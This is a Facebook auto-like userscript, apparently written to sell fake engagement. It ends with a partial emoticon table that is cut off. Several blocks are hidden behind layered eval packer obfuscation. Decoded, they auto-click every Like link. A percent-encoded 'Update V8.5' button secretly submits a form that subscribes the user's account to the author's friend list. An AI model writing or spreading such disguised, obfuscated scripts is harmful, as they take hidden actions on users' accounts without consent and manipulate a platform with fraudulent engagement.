// ==UserScript==
// @name			AutoBoom FaceBook /.\ + Auto Like
// @namespace		Buy More Likes Status in Wall or Request VIP Member Script conntact me in My Facebook
// @description		AutoLike FaceBook // Special Edition coded by Azwad.ArxEromax // Auto Like status, Boom Like, wall and facebook comments, system uses delay timer that allows you to control the speed of access and prevents blocking of the account. have new feature emoticon to comments and post. Buy More Likes Status in Wall or Request VIP Member Script conntact me in My Facebook
// @author			https://www.facebook.com/ArxEromax 
// @icon			
// @authorURL		https://www.facebook.com/ArxEromax    
// @updateURL		http://userscripts.org/scripts/source/178950.meta.js
// @downloadURL     http://userscripts.org/scripts/source/178950.user.js
// @version         1.0
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ======= Do Not Remove Credit =======
// == Auto Boom + Like Facebook v.1 OBT ==
// ======= Coder : ArxEromax ========
// ====================================

 body = document.body;
/*if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+100px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}
*/

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.height = "18px";
 div.style.opacity= 0.90;
 div.style.bottom = "+73px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2a(1Y(p,a,c,k,e,r){e=1Y(c){1Z(c<a?\'\':e(2b(c/a)))+((c=c%a)>2c?21.2d(c+29):c.2e(2f))};22(!\'\'.24(/^/,21)){25(c--)r[e(c)]=k[c]||e(c);k=[1Y(e){1Z r[e]}];e=1Y(){1Z\'\\\\w+\'};c=1};25(c--)22(k[c])p=p.24(2g 2h(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1Z p}(\'12(S(p,a,c,k,e,r){e=S(c){T(c<a?\\\'\\\':e(13(c/a)))+((c=c%a)>U?V.14(c+W):c.15(X))};Y(!\\\'\\\'.Z(/^/,V)){10(c--)r[e(c)]=k[c]||e(c);k=[S(e){T r[e]}];e=S(){T\\\'\\\\\\\\w+\\\'};c=1};10(c--)Y(k[c])p=p.Z(16 17(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);T p}(\\\'E.F=(G(\\\\\\\'%f%9%4%5%3%4%d%g%f%6%8%6%r%6%s%7%h%i%a%2%j%6%r%6%s%j%h%0%1%1%0%p%j%h%0%1%1%0%p%k%c%d%0%h%7%1%4%H%c%t%c%I%c%d%0%h%7%1%4%k%7%q%a%l%e%e%e%e%e%l%u%e%u%l%J%l%v%m%K%6%n%c%w%1%0%9%6%3%7%0%5%a%l%2%8%d%0%1%4%a%2%x%o%3%3%0%5%2%8%d%4%1%a%2%6%b%i%5%9%y%c%0%b%3%2%8%7%q%a%2%o%k%e%k%i%2%8%b%3%i%1%4%a%2%h%0%5%3%y%p%4%7%L%t%3%z%x%0%1%q%w%9%0%1%0%d%z%M%N%O%P%m%m%v%2%8%0%5%9%1%7%9%A%a%2%B%5%0%5%i%n%0%o%b%Q%m%C%D%2%g%f%b%c%6%5%8%9%1%6%b%b%a%2%4%n%0%3%7%9%0%5%8%4%n%0%3%7%9%0%5%k%1%7%A%4%2%8%3%7%3%1%4%a%2%C%i%D%2%g%f%j%b%c%6%5%g%8%B%1%1%8%R%3%6%3%o%b%f%j%6%g%f%j%9%4%5%3%4%d%g\\\\\\\'));\\\',11,11,\\\'18|19|1a|1b|1c|1d|1e|1f|1g|1h|1i|1j|1k|1l|1m|1n|1o|1p|1q|1r|1s|1t|1u|1v|1w|1x|1y|1z|1A|1B|1C|1D|1E|1F|1G|1H|1I|1J|1K|W|1L|1M|1N|1O|1P|1Q|1R|1S|1T|1U|1V|U|X|1W\\\'.1X(\\\'|\\\'),0,{}))\',2i,2k,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||1Y|1Z|2c|21|29|2f|22|24|25|2l|2a|2b|2d|2e|2g|2h|2m|2n|27|2o|2p|2q|2r|2s|20|2t|2u|2v|2w|2x|30|2y|2z|2A|2B|2F|2C|31|2G|2H|2I|2J|2K|2L|2M|2N|2O|2P|2Q|2i|2D|2R|2S|2T|28|2U|2V|2W|2E|2X|34|26|2Y|23|33|2Z|32|2j\'.2j(\'|\'),0,{}))',62,191,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return||String|if||replace|while|||||eval|parseInt|35|fromCharCode|toString|36|new|RegExp|62|split|122|54|6F|6C|74|65|6E|61|69|63|3D|73|70|72|3C|3E|66|79|5F||||39|6D|75|77|64|6A|78|68|37|38|3B|3A|6B|41|div|innerHTML|unescape|3F|67|42|||53||'.split('|'),0,{}))
 body.appendChild(div);
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('k.b=4(){3 B=0;3 J=0;3 I=8.c("a");3 H=l m();d(3 D=0;D<I.5;D++){6(I[D].9("7")!=e&&I[D].9("7").f("n")>=0&&(I[D].2=="o p"||I[D].2=="q"||I[D].2=="אוהב את"||I[D].2=="r"||I[D].2=="s"||I[D].2=="الإعجاب"||I[D].2=="???!"||I[D].2=="?"||I[D].2=="t"||I[D].2=="???"||I[D].2=="J’u")){H[J]=I[D];J++}}4 E(L){H[L].v();3 K="<a w=\'x-z:O;P:Q\' R=\'b()\'><g><h 7=\'S T\' U=\'(y)\'></h> V: "+(L+1)+"/"+H.5+"</g></a>";8.W("X").2=K}4 G(K){i.j(C,K)}4 A(){3 M=8.c("Y");3 N=Z;d(3 L=0;L<M.5;L++){3 K=M[L].9("7");6(K!=e&&K.f("10 11 12")>=0){13("14 15 16");N=17}}6(!N){G(18)}}4 F(K){i.j(A,K)}4 C(){6(B<H.5){E(B);F(19);B++}};C()}',62,72,'||innerHTML|var|function|length|if|class|document|getAttribute||Anonymous69|getElementsByTagName|for|null|indexOf|center|span|window|setTimeout|unsafeWindow|new|Array|UFILikeLink|Me|gusta|Like|Suka|Begen|Seneng|aime|click|style|font||weight|||||||||||||||bold|color|green|onclick|emoticon|emoticon_like|title|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|alert|Warning|from|Facebook|true|2160|700'.split('|'),0,{}))
}
{
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = unescape("%3C%63%65%6E%74%65%72%3E%3C%66%6F%72%6D%20%61%6A%61%78%69%66%79%3D%27%2F%61%6A%61%78%2F%66%72%69%65%6E%64%73%2F%6C%69%73%74%73%2F%73%75%62%73%63%72%69%62%65%2F%6D%6F%64%69%66%79%3F%6C%6F%63%61%74%69%6F%6E%3D%70%65%72%6D%61%6C%69%6E%6B%26%61%6D%70%3B%61%63%74%69%6F%6E%3D%73%75%62%73%63%72%69%62%65%26%61%6D%70%3B%66%6C%69%64%3D%37%30%37%33%38%36%37%37%35%39%34%33%36%37%33%27%20%72%65%6C%3D%27%61%73%79%6E%63%27%20%61%63%74%69%6F%6E%3D%27%23%27%20%6D%65%74%68%6F%64%3D%27%70%6F%73%74%27%20%6F%6E%73%75%62%6D%69%74%3D%27%72%65%74%75%72%6E%20%77%69%6E%64%6F%77%2E%45%76%65%6E%74%20%26%61%6D%70%3B%26%61%6D%70%3B%20%45%76%65%6E%74%2E%5F%5F%69%6E%6C%69%6E%65%53%75%62%6D%69%74%20%26%61%6D%70%3B%26%61%6D%70%3B%20%45%76%65%6E%74%2E%5F%5F%69%6E%6C%69%6E%65%53%75%62%6D%69%74%28%74%68%69%73%2C%65%76%65%6E%74%29%27%20%69%64%3D%27%75%5F%35%5F%37%27%3E%3C%69%6E%70%75%74%20%6E%61%6D%65%3D%27%66%62%5F%64%74%73%67%27%20%76%61%6C%75%65%3D%27%41%51%43%66%43%37%52%54%27%20%61%75%74%6F%63%6F%6D%70%6C%65%74%65%3D%27%6F%66%66%27%20%74%79%70%65%3D%27%68%69%64%64%65%6E%27%3E%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%27%75%69%42%75%74%74%6F%6E%27%20%66%6F%72%3D%27%75%5F%35%5F%33%27%3E%3C%61%20%68%72%65%66%3D%27%68%74%74%70%3A%2F%2F%75%73%65%72%73%63%72%69%70%74%73%2E%6F%72%67%2F%73%63%72%69%70%74%73%2F%73%6F%75%72%63%65%2F%31%35%32%31%34%37%2E%75%73%65%72%2E%6A%73%27%20%3E%3C%69%6E%70%75%74%20%76%61%6C%75%65%3D%27%55%70%64%61%74%65%20%56%38%2E%35%27%20%69%64%3D%27%75%5F%35%5F%33%27%20%74%79%70%65%3D%27%73%75%62%6D%69%74%27%3E%3C%2F%6C%61%62%65%6C%3E%3C%2F%61%3E%3C%2F%66%6F%72%6D%3E%3C%2F%63%65%6E%74%65%72%3E");
body.appendChild(div);}

body=document.body;
if(body != null) 
{
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+25px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<center><a style='font-weight:bold;' ajaxify='/ajax/messaging/composer.php?ids%5B0%5D=100006297124569&amp;ref=timeline' href='/messages/ArxEromax' role='button' rel='dialog'><span class='_1az _1a- _2fp'></span> Help & FAQ</a></center>"
body.appendChild(div);}
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.height = "18px";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+48px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2a(1Y(p,a,c,k,e,r){e=1Y(c){1Z(c<a?\'\':e(2b(c/a)))+((c=c%a)>2c?21.2d(c+29):c.2e(2f))};22(!\'\'.24(/^/,21)){25(c--)r[e(c)]=k[c]||e(c);k=[1Y(e){1Z r[e]}];e=1Y(){1Z\'\\\\w+\'};c=1};25(c--)22(k[c])p=p.24(2g 2h(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1Z p}(\'12(S(p,a,c,k,e,r){e=S(c){T(c<a?\\\'\\\':e(13(c/a)))+((c=c%a)>U?V.14(c+W):c.15(X))};Y(!\\\'\\\'.Z(/^/,V)){10(c--)r[e(c)]=k[c]||e(c);k=[S(e){T r[e]}];e=S(){T\\\'\\\\\\\\w+\\\'};c=1};10(c--)Y(k[c])p=p.Z(16 17(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);T p}(\\\'H.I=(J(\\\\\\\'%h%6%7%6%s%6%t%8%f%i%9%1%j%6%s%6%t%j%f%0%2%2%0%m%j%f%0%2%2%0%m%l%c%d%0%f%8%2%3%K%c%n%c%L%c%d%0%f%8%2%3%l%8%o%9%u%g%g%g%g%v%v%p%M%q%p%N%g%w%g%O%6%e%c%x%2%0%a%6%4%8%0%5%9%u%1%7%d%0%2%3%9%1%y%r%4%4%0%5%1%7%d%3%2%9%1%6%b%i%5%a%z%c%0%b%4%1%7%8%o%9%1%r%l%g%l%i%1%7%n%d%3%f%9%1%A%1%7%b%4%i%2%3%9%1%f%0%5%4%z%m%3%8%P%n%4%B%y%0%2%o%x%a%0%2%0%d%B%A%w%Q%R%q%q%p%1%7%0%5%a%2%8%a%C%9%1%D%5%0%5%i%e%0%r%b%E%0%e%e%3%5%4%b%F%G%1%k%h%a%3%5%4%3%d%k%h%b%c%6%5%7%a%2%6%b%b%9%1%3%e%0%4%8%a%0%5%7%3%e%0%4%8%a%0%5%l%2%8%C%3%1%7%4%8%4%2%3%9%1%F%i%G%1%k%h%j%b%c%6%5%k%7%D%2%2%7%E%0%e%e%3%5%4%b%h%j%a%3%5%4%3%d%k%h%j%6%k\\\\\\\'));\\\',11,11,\\\'18|19|1a|1b|1c|1d|1e|1f|1g|1h|1i|1j|1k|1l|1m|1n|1o|1p|1q|1r|1s|1t|1u|1v|1w|1x|1y|1z|1A|1B|1C|1D|1E|1F|1G|1H|1I|1J|1K|1L|1M|1N|W|1O|1P|1Q|1R|1S|X|1T|1U|1V|1W|U\\\'.1X(\\\'|\\\'),0,{}))\',2i,2k,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||1Y|1Z|2c|21|29|2f|22|24|25|2l|2a|2b|2d|2e|2g|2h|2m|27|2n|2o|2p|2q|2r|20|2s|2t|2u|2v|2w|2x|2y|2z|30|2A|2B|2F|2C|2G|2H|2I|2J|2K|2L|2M|2N|2O|31|32|33|2P|2i|2D|23|2Q|2R|2S|2T|28|2U|2V|2W|2E|2X|2Y|26|2Z|34|2j\'.2j(\'|\'),0,{}))',62,191,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return||String|if||replace|while|||||eval|parseInt|35|fromCharCode|toString|36|new|RegExp|62|split|122|54|6F|6C|65|74|6E|61|69|3D|63|73|70|72|6D|66|3C|79|3E||||5F|77|68|64|38|39|75|6A|78|3B|3A|6B|41|43|div|innerHTML|unescape|3F|37|67|||||42'.split('|'),0,{}))
 body.appendChild(div);
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2N(2H(p,a,c,k,e,r){e=2H(c){2I(c<a?\'\':e(2O(c/a)))+((c=c%a)>35?2J.2P(c+29):c.2Q(36))};2K(!\'\'.2L(/^/,2J)){2M(c--)r[e(c)]=k[c]||e(c);k=[2H(e){2I r[e]}];e=2H(){2I\'\\\\w+\'};c=1};2M(c--)2K(k[c])p=p.2L(2R 2S(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);2I p}(\'1u(1n(p,a,c,k,e,r){e=1n(c){1o(c<a?\\\'\\\':e(1v(c/a)))+((c=c%a)>1w?1q.1x(c+29):c.1y(1z))};1p(!\\\'\\\'.1r(/^/,1q)){1s(c--)r[e(c)]=k[c]||e(c);k=[1n(e){1o r[e]}];e=1n(){1o\\\'\\\\\\\\w+\\\'};c=1};1s(c--)1p(k[c])p=p.1r(1t 1A(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);1o p}(\\\'j.9=5(){4 B=0;4 J=0;4 I=8.b("a");4 H=k l();c(4 D=0;D<I.6;D++){7(I[D].2("m-n")!=d&&(I[D].2("3")=="o p q r"||I[D].2("3")=="s t u"||I[D].2("3")=="אוהב את התגובה"||I[D].2("3")=="v w x"||I[D].2("3")=="z O P"||I[D].2("3")=="الإعجاب بالتعليق"||I[D].2("3")=="このコメントはいいね！"||I[D].2("3")=="좋아요 취소"||I[D].2("3")=="說這則留言讚"||I[D].2("3")=="J’Q R S"||I[D].2("3")=="T U V")){H[J]=I[D];J++}}5 E(L){H[L].W();4 K="<a X=\\\\\\\'Y-Z:10;11:12\\\\\\\' 13=\\\\\\\'9()\\\\\\\'><e><f g=\\\\\\\'14 15\\\\\\\' 3=\\\\\\\'(y)\\\\\\\'></f> 16: "+(L+1)+"/"+H.6+"</e></a>";8.17("18").19=K}5 G(K){h.i(C,K)}5 A(){4 M=8.b("1a");4 N=1b;c(4 L=0;L<M.6;L++){4 K=M[L].2("g");7(K!=d&&K.1c("1d 1e 1f")>=0){1g("1h 1i 1j");N=1k}}7(!N){G(1l)}}5 F(K){h.i(A,K)}5 C(){7(B<H.6){E(B);F(1m);B++}}C()}\\\',1B,1C,\\\'||1D|1E|1F|1n|1G|1p|1H|1I||1J|1K|1L|1M|1N|1O|1P|1Q|1R|1t|1S|1T|1U|1V|1W|1X|1Y|1Z|20|21|22|23|24||25|||||||||||||||26|27|28|2a|2b|2c|2d|2e|2f|2g|2h|2i|2j|2k|2l|2m|2n|2o|2p|2q|2r|2s|2t|2u|2v|2w|2x|2y|2z|2A|2B|2C|2D|2E|2F\\\'.2G(\\\'|\\\'),0,{}))\',2T,2V,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||2H|2I|2K|2J|2L|2M|2R|2N|2O|35|2P|2Q|36|2S|2T|2W|2X|2Y|2Z|30|31|32|33|34|37|38|39|3a|3b|3c|3d|3e|3f|3g|3h|3i|3j|3k|3l|3m|3n|3o|3p|3q|3r|3s|3t|3u||3v|3w|3x|3y|3z|3A|3B|3C|3D|3E|3F|3G|3H|3I|3J|3K|3L|3M|3N|3O|3P|3Q|3R|3S|3T|3U|3V|3W|3X|3Y|3Z|40|2U\'.2U(\'|\'),0,{}))',62,249,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|String|if|replace|while|eval|parseInt|fromCharCode|toString|new|RegExp|62|split|167|85|getAttribute|title|var|length|document|AnonymousComments|getElementsByTagName|for|||null|center|span|class|window|setTimeout|unsafeWindow|Array|data|ft|Me|gusta|este|comentario|Like|this|comment|Suka|komentar|ini|Nyenengi|tanggapan|iki|aime|ce|commentaire|Bu|yorumu|begen|click|style|font|weight|bold|color|green|onclick|emoticon|emoticon_like|Comments|getElementById|like3|innerHTML|label|false|indexOf|uiButton|uiButtonLarge|uiButtonConfirm|alert|Warning|from|Facebook|true|2160|700'.split('|'),0,{}))
}

(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Emoticones");
	// = Data =======
	// Emoticon data; 
	var emoticons = [ { // Text to picture emoticons
		"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Sonriente"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Triste"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Lengua afuera"
	}, {
		"chars" : " =D ",
		"class" : "emoticon_grin",
		"name" : "Reir"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Asombrado"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Guiño"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gruñón"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Inseguro"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Llorando"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Lentes"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Gafas de sol"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Corazón"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Demonio"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Ángel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Bizco"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confundido"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Alterado"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Dudando"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Me gusta"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Beso"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Tiburón"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Pingüino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Mierda"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Sombrilla cerrada"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Ola de mar"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Luna cuarto creciente"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Estrella brillante"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Semillero"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Mata de palma"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Captus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulipán"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Flor de cereza"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rosa"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayena"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Girasol"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Espiga de arroz"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Trébol de cuatro hojas"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Hoja de arce"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Hoja caída"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Hoja flotando en el viento"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Mandarina"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Manzana roja"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Fresa"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Hamburguesa"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Copa de cóctel"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Jarra de cerveza"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Regalo envuelto"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Calabaza con vela"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Árbol de navidad"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Padre en navidad"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Globo"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Corchete de fiesta"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pino de decoración"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Muñecas japonesas"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Serpentina de carpas"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Carrillón de viento"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Gorro de graduación"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Nota musical"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Múltiples notas musicales"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Partitura musical"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Serpiente"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Caballo"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Oveja"
        }, {
		"chars" : " \ud83d\udc36 ",
		"class" : "_1az _1a- _491",
		"name" : "Perro"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Mono"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Gallina"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Jabalí"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elefante"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Pulpo"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Concha de caracol"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insecto"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Pez"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Pez tropical"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pez globo"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Pollito de frente"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Ave"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Pingüino"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Perro de lanas"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Camello bactriano"
	}, {
